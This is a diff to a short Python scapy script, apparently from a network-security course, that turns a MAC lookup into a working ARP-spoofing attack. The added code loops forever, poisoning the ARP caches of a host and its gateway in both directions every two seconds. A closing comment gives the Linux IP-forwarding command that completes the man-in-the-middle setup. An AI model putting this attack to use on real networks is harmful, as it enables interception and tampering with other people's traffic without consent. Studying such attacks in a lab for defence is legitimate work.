@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
+import time
 
 
 def get_mac(ip):
@@ -17,7 +18,6 @@ def get_mac(ip):
     # verbose=false  dont allows to write unnecassary words
    # print(answered_list.summary())  # to check output
     return (answered_list[0][1].hwsrc)
-# update
 
 
 def spoof(target_ip, spoof_ip):
@@ -28,4 +28,10 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet)
 
 
-get_mac("10.0.2.1")
+while True:
+    spoof("10.0.2.7", "10.0.2.1")
+    spoof("10.0.2.1", "10.0.2.7")
+    time.sleep(2)
+
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward    ip forwarding for linux
